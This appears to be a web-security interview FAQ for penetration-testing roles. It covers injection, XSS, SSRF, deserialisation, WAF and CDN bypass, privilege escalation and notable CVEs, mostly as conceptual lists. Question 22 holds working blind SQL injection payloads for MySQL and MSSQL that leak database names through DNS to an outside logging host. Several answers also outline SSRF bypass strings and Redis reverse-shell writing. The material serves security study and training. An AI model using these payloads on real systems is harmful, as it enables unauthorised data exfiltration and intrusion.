docs.title: Topics / Frequently Asked Questions
docs.text:
-- Select Topic -- Web Security FAQs

Select a topic above to load FAQs on the left.

docs.title: 1. What are the principles and types of SQL injection? How can it be defended against? What is the principle of prepared statements?
Principle
docs.text: During data interaction, data input from the front end is transmitted to the backend for processing. Because the backend does not apply sufficiently strict validation, the incoming “data” is concatenated into an SQL statement and subsequently executed as part of that statement.

docs.title: Types
docs.text:
• Character-based
  • Numeric
  • Boolean-based
  • Error-based
  • Time-based (delay)
  • UNION-based
  • Stacked queries
  • Wide-byte
  • X-Forwarded-For (XFF), etc.

docs.title: Remediation
docs.text:
• Use prepared statements / parameterized queries
  • Use PDO (in PHP) or equivalent in other languages
  • Regular expression / input validation
  • Web Application Firewall (WAF)
  • Enable proper escaping

docs.title: Principle of Prepared Statements
docs.text: A prepared statement completes a single query via two interactions. The first interaction sends the query template, which the backend SQL engine parses into an Abstract Syntax Tree (AST) or Opcode. The second interaction sends the data, which is then substituted into the AST or Opcode for execution. Regardless of the parameters subsequently passed to the template, they are treated solely as string literals during query processing, thereby eliminating SQL injection.

docs.title: 2. What are the types of XSS? What are the differences between them? How can it be remediated?
Types
docs.text:
• Stored (persistent)
  • Reflected
  • DOM-based

docs.title: Differences
docs.text:
• Stored XSS: Often occurs in areas such as information modification or insertion; malicious code is stored in the database and executes whenever a victim accesses the affected page.
  • Reflected XSS: Commonly appears within URLs. An attacker typically crafts a malicious link in advance and deceives the user into clicking it, thereby triggering the attack code.
  • DOM-based XSS: The attack code resides in the URL and is subsequently written into a DOM node within the browser. Stored and reflected XSS involve the server, whereas DOM-based XSS is entirely client-side.

docs.title: Remediation
docs.text:
• Perform HTML encoding on input data
  • Apply whitelist filtering
  • Filter tags that contain JavaScript events
  • Enable the HttpOnly flag
  • Deploy a WAF

docs.title: 3. What are the differences between XSS, CSRF, and SSRF? (Very frequently asked)
Definitions
docs.text:
• XSS: Cross-Site Scripting
  • CSRF: Cross-Site Request Forgery
  • SSRF: Server-Side Request Forgery

docs.title: Differences
docs.text:
• XSS occurs when the server fails to sufficiently filter user-supplied data, causing the client browser to execute unexpected script statements when rendering the HTML page returned by the server.
  • CSRF occurs when the server does not validate a random token (anti-CSRF token) for user-submitted data and loosely checks the Referer field within HTTP request packets, allowing an attacker to forge requests using the victim’s cookie information and send them to the server.
  • SSRF occurs when the server places excessive trust in a user-controlled URL, failing to apply address restrictions and adequate detection to the URL provided by the attacker. This enables the attacker to use the vulnerable server as a springboard to attack internal networks or other servers.

docs.title: 4. Are you familiar with XXE vulnerabilities?
Explanation
docs.text: The XXE (XML External Entity) vulnerability occurs when an application parses XML input without prohibiting the loading of external entities. This can lead to the loading of malicious external files, resulting in file disclosure, command execution, scanning of internal network ports, attacks on internal websites, and denial-of-service (DoS) attacks.

docs.title: 5. Are you familiar with PHP deserialisation?
Serialisation and Deserialisation
docs.text: Serialisation is the process of converting an object into a string; deserialisation is the reverse process – converting a string back into an object.

docs.title: Types
docs.text:
• Without classes: If the source code deserialises the input value, one must serialise the data in advance before submitting it.
  • With classes: Exploitation leverages magic methods. Magic methods function like implicit rules; for instance, when an object is created, __construct() is automatically triggered and the code within __construct() is executed.

Analogy: It is like someone calling your girlfriend’s name, and immediately her image appears in your mind without any conscious effort – it is simply an unconscious invocation of a rule.

docs.title: 5.1 Are you familiar with Java deserialisation? Have you encountered Shiro deserialisation? (Most frequently asked, both in HVV and job interviews)
Java Serialisation
docs.text: In Java, the writeObject() method of the ObjectOutputStream class performs serialisation, converting an object into a byte stream for convenient storage or transmission. Conversely, the readObject() method of the ObjectInputStream class performs deserialisation, reconstructing the original object from the byte stream.

docs.title: Shiro Deserialisation
docs.text:
Shiro deserialisation primarily arises from the “Remember Me” functionality provided by Apache Shiro. Upon successful user login, an encrypted and encoded cookie is generated and stored in the browser.

Server-side processing flow: Retrieve cookie → Base64 decode → AES decrypt → Deserialise → Verify.

Exploitation: AES uses hard-coded keys. If the developer does not change this key or uses an overly simple one, an attacker can reconstruct the cookie. The attacker constructs malicious code, serialises it, encrypts it with the known key, encodes with Base64, and creates a new cookie. When the server processes this cookie, the malicious code is triggered.

docs.title: 6. Which logic vulnerabilities have you encountered? Given a login form, what is your general approach?
Common Logic Vulnerabilities
docs.text:
• Privilege escalation
  • Response manipulation
  • Payment amount manipulation
  • Cookie brute-forcing
  • Password recovery flaws

docs.title: Login Page Approach
docs.text:
• Brute-force attacks
  • Session fixation
  • SQL injection
  • XSS
  • Arbitrary user registration
  • Inspecting JavaScript files for sensitive information
  • SMS bombing
  • Universal passwords
  • Second-order injection
  • Template injection

docs.title: 7. What is the difference between CDN and DNS? What are the approaches for bypassing CDN?
CDN (Content Delivery Network)
docs.text: Its primary function is to enable users to access web resources from a geographically proximate node, improving response speed and reducing network congestion.

docs.title: DNS (Domain Name System)
docs.text: Its primary function is to translate domain names into IP addresses.

docs.title: CDN Bypass Approaches
docs.text:
• Subdomain enumeration
  • Internal email headers
  • Dark search engine queries
  • Pinging from foreign locations
  • Certificate and DNS records analysis
  • App traffic interception
  • Misconfiguration exposure
  • Scanning the entire IP range
  • DoS attacks

docs.title: 8. What common middleware vulnerabilities are you aware of?
docs.text:
• IIS: PUT vulnerability, short file name guessing, remote code execution, parsing vulnerabilities.
  • Apache: Parsing vulnerabilities, directory traversal.
  • Nginx: File parsing vulnerabilities, directory traversal, CRLF injection, path traversal.
  • Tomcat: Remote code execution, deployment of WAR backdoor files.
  • JBoss: Deserialisation vulnerabilities, deployment of WAR backdoor files.
  • WebLogic: Deserialisation vulnerabilities, SSRF, arbitrary file upload, deployment of WAR backdoor files.

docs.title: 9. What WAF bypass techniques are you familiar with?
Architectural Level
docs.text:
• Discover the server’s real IP address
  • Bypass via same subnet
  • Bypass by having both HTTP and HTTPS services exposed
  • Exploit vulnerabilities on perimeter assets

docs.title: Protocol Level
docs.text:
• Chunked transfer encoding with delays
  • Pipeline-based bypass
  • Exploiting uncovered protocol quirks
  • Alternating between POST and GET submissions

docs.title: Rule Level
docs.text:
• Encoding bypass
  • Substitution with equivalent symbols
  • Ordinary and inline comments
  • Buffer overflow
  • MySQL black magic
  • Whitelist and static resource bypass
  • File format bypass
  • Parameter pollution

docs.title: 10. How do you resolve the issue of command execution with no output (blind command execution)?
Approaches
docs.text:
• Time-based delay detection
  • Outbound HTTP request monitoring
  • DNS log (DNSLog) exploitation
  • Writing output to a web-accessible directory and downloading it

docs.title: 11. What are the scenarios in which port 3389 cannot be connected?
docs.text:
1. The 3389 port is in a closed state.
  2. The port number has been modified.
  3. It is being blocked by a firewall.
  4. The machine is within an internal network environment.
  5. The maximum number of server connections has been exceeded.
  6. The administrator has configured permissions restricting login to specific users.

docs.title: 12. Common port information?
docs.text: Port Service 21 FTP (File Transfer Protocol) 22 SSH (Secure Shell) 23 Telnet (Remote login) 25 SMTP (Simple Mail Transfer Protocol) 53 DNS (Domain Name System) 80 HTTP (Hypertext Transfer Protocol) 443 HTTPS (HTTP Secure) 1433 MSSQL 3306 MySQL 3389 Windows Remote Desktop Service 7701 WebLogic 8080 TCP, HTTP proxy; default Tomcat port

docs.title: 13. What is the penetration testing process?
For a Single Website
docs.text:
1. Determine whether a CDN is in use; if so, discover the real IP.
  2. If no CDN, scan neighbouring sites and C-class IP ranges.
  3. Identify the CMS and determine middleware, plugins, and OS.
  4. Perform port scanning and directory brute-forcing.
  5. Examine JavaScript files for sensitive information.
  6. Look for associated mobile apps, official accounts, etc. to expand the asset footprint.
  7. Conduct routine vulnerability probing based on gathered information.

docs.title: For a Network Segment or Region
docs.text: • Use tools like Goby for batch scanning and mass exploit deployment, then probe identified weak points.

docs.title: 14. What is a logic vulnerability? Name at least three types of business logic vulnerabilities and how to remediate them.
Definition
docs.text: A logic vulnerability refers to a flaw caused by lax program logic or overly complex logic, resulting in some logical branches failing to execute correctly or executing erroneously.

docs.title: Payment Vulnerabilities
docs.text:
• Price manipulation
  • Payment status modification
  • Quantity integer overflow
  • Order substitution
  • Payment gateway switching
  • Rounding manipulation
  • Privilege-escalation payment

docs.title: Login Vulnerabilities
docs.text:
• Status flag modification
  • Bypassing verification during password changes

docs.title: Password Recovery Vulnerabilities
docs.text:
1. Allowing brute-force attacks on passwords
  2. Existence of a universal recovery token
  3. Ability to skip verification steps
  4. Recovery tokens can be intercepted

docs.title: Authentication Vulnerabilities
docs.text:
• Session fixation attacks
  • Cookie impersonation (once Session or Cookie is obtained, user identity can be forged)

docs.title: CAPTCHA Vulnerabilities
docs.text:
1. Allowing brute-force attacks on the CAPTCHA
  2. Bypassing via JavaScript or packet modification

docs.title: 15. Can you briefly explain unauthorised access?
Redis Unauthorised Access
docs.text: When authentication is not enabled, an attacker can connect directly. They generate an SSH key pair with an empty passphrase, write the public key to the target, and then connect using the private key.

docs.title: JBoss Unauthorised Access
docs.text: Accessing /jmx-console without credentials allows browsing the deployment management console and directly deploying a backdoor.

docs.title: General
docs.text: Insufficient validation permits bypassing authentication and directly accessing pages that should be protected.

docs.title: 16. Which vulnerabilities do you typically use for initial compromise (“scoring a hit”)?
Priority
docs.text: Java deserialisation vulnerabilities such as Shiro, Fastjson, WebLogic, and Yonyou OA, because Java web applications often run with high privileges by default. Afterwards, other fragile, easily exploitable points are sought.

docs.title: 17. How do you usually discover Shiro vulnerabilities?
Indicators
docs.text:
• When login fails, the Set-Cookie header often contains rememberMe=deleteMe.
  • Passive scanning tools like ShiroScan.

docs.title: Detailed Behaviour
docs.text:
• Without login: Request cookie has no rememberMe; response Set-Cookie lacks deleteMe.
  • Login failure: Response always contains rememberMe=deleteMe.
  • Login success without “Remember Me”: Response Set-Cookie contains rememberMe=deleteMe, subsequent requests lack rememberMe.
  • Login success with “Remember Me”: Response Set-Cookie contains rememberMe=deleteMe and a rememberMe field; all subsequent requests include rememberMe.

docs.title: 18. WebLogic permission bypass?
docs.text:
1. Bypass authentication via static resources to avoid redirection to the login page.
  2. Request .portal so the handling Servlet is MBeanUtilsInitSingleFileServlet, which renders the UI.
  3. Use an encoded ../ so the final rendered template becomes console.portal.

docs.title: 19. What is the exploitation principle of the Fastjson vulnerability?
Principle
docs.text: A malicious JSON payload is sent. The @type field is not filtered, allowing the attacker to pass a malicious TemplatesImpl class. This class contains a _bytecodes field, and certain functions instantiate a Java object based on this field. Thus Fastjson receives a class via a field, and upon instantiation the constructor is executed.

docs.title: 20. What can be done if you obtain a webshell but the target cannot initiate outbound connections?
Approaches
docs.text:
• Upload a Reg forward shell for direct connection.
  • Probe for allowed outbound protocols such as DNS or ICMP.

docs.title: 21. What are the dangerous functions for PHP code execution and PHP command execution?
PHP Code Execution
docs.text:
• call_user_func()
  • call_user_func_array()
  • create_function()
  • array_map()

docs.title: PHP Command Execution
docs.text:
• system()
  • shell_exec()
  • passthru()
  • exec()
  • popen()
  • proc_open()
  • putenv()

docs.title: 22. When SQL injection yields no visible output, how can DNSLog be utilised, and what constructs can be used under MySQL and MSSQL respectively?
General Approach
docs.text:
• Write a script for automated injection; adjust request frequency or use proxy pools.
  • DNSLog injection: place the server’s result in a domain name and read the DNS resolution logs.

docs.title: MySQL
docs.text:
Use load_file(): 

' and if((select load_file(concat('\\\\',(select database()),'.\\abc'))),1,0)#xxx.ceye.io

docs.title: MSSQL
docs.text:
Use master..xp_dirtree: 

DECLARE @host varchar(1024);SELECT @host=db_name()+'. ';EXEC('master..xp_dirtree "\\'+@host+'\foobar$"');xxx.ceye.io

docs.title: 23. What are the methods to write a shell via phpMyAdmin?
docs.text:
• Conventional shell import operations.
  • One-liner shell export.
  • Log backup shell acquisition.

docs.title: 24. What is the principle of buffer overflow?
Principle
docs.text: C/C++ languages lack array bounds checking. When data written to a local array buffer exceeds its allocated size, a buffer overflow occurs. An attacker can corrupt the process’s runtime stack, altering the normal program flow. For example, of an extra 500 bytes, 100 may contain a JMP instruction redirecting to the remaining 400 bytes of shellcode, which then establishes a reverse connection.

docs.title: 25. How can SSRF be bypassed when 127.0.0.1 is blocked? What protocols are supported?
Bypass Techniques
docs.text:
1. Number base conversions
  2. DNS resolution
  3. Full‑width characters (e.g., 127。0。0。1)
  4. Using [::] (e.g., http://[::]:80/)
  5. Using @ (e.g., http://example.com@127.0.0.1)
  6. Shortened URLs (e.g., http://dwz.cn/11SMa)

docs.title: Supported Protocols
docs.text: dict://, sftp://, tftp://, ldap://, gopher://

docs.title: 26. How can the phar:// protocol be exploited? What is the difference between the php://input pseudo‑protocol and POST data delivery?
phar:// Exploitation
docs.text:
• Bypass certain WAFs and upload restrictions.
  • Phar deserialisation: when the wrapper reads a .phar file, it deserialises the stored metadata.

docs.title: php://input vs POST
docs.text:
• application/x-www-form-urlencoded or multipart/form-data: php://input contains raw data; $_POST is an associative array without upload content.
  • multipart/form-data: php://input is invalid.
  • Content-Type: text/plain: $_POST cannot retrieve data, but php://input can.

docs.title: 27. How does SSRF write a shell using Redis?
SSRF Capabilities
docs.text:
• Internal network scanning, banner grabbing.
  • Attacking internal applications using GET‑parameter exploits.
  • Reading local files via protocols.
  • In cloud environments, calling internal APIs to manipulate ECS instances.

docs.title: WebLogic SSRF Exploitation
docs.text: Use the Gopher protocol via SSRF to interact with an internal Redis instance. Employ Redis to write a reverse shell into a crontab scheduled task. The payload is URL‑encoded and \r replaced with %0d%0a.

docs.title: 28. What built‑in tamper scripts of sqlmap are you aware of? Have you ever written any?
docs.text:
• apostrophemask.py – Replaces apostrophes with UTF‑8 representation to bypass single‑quote filtering.
  • base64encode.py – Base64‑encodes the payload.
  • multiplespaces.py – Adds multiple spaces around SQL keywords.
  • space2plus.py – Replaces spaces with +.

docs.title: 29. What is SVN/GIT source code disclosure?
SVN
docs.text: Using SVN automatically generates a hidden .svn folder containing important source code information.

docs.title: GIT
docs.text: If a site is deployed with Git and configuration is inadequate, the .git folder may be deployed to the production environment, leading to a Git leakage vulnerability.

docs.title: 30. Are you familiar with privilege escalation? What is the principle of UDF privilege escalation?
UDF Privilege Escalation
docs.text:
1. Place the UDF file in the appropriate directory (MySQL > 5.1: lib/plugin under the MySQL root).
  2. Import the custom function from the UDF file.
  3. Execute the custom function to perform privileged operations.

docs.title: 31. Describe some recent or representative vulnerabilities.
Microsoft Exchange CVE-2020-0688
docs.text: ECP component used static keys validationKey and decryptionKey, allowing .NET deserialisation RCE.

docs.title: Apache Tomcat CVE-2020-1938
docs.text: AJP connector flaw enables reading or including arbitrary files in the web root; with file upload, RCE is possible.

docs.title: WebLogic CVE-2020-2551
docs.text: IIOP protocol deserialisation vulnerability leading to RCE.

docs.title: Apache Solr CVE-2019-12409
docs.text: Insecure default JMX configuration exposes RMI port without authentication, enabling JMX RMI RCE.

docs.title: SHIRO-550
docs.text: Hard‑coded AES key in CookieRememberMeManager leads to deserialisation RCE.

docs.title: SHIRO-721
docs.text: Padding Oracle Attack constructs a valid RememberMe cookie without the key.

docs.title: Weaver Ecology OA
docs.text:
• SQL injection in /cpt/manage/validate.jsp.
  • Database config disclosure at /mobile/dbconfigreader.jsp, encrypted with DES and a hard‑coded key.

docs.title: Confluence CVE-2019-3394
docs.text: Path traversal within /WEB-INF via the validate filter in catalina.jar.

docs.title: Apache Dubbo CVE-2019-17564
docs.text: When HTTP remoting is enabled, a deserialisation vulnerability exists.
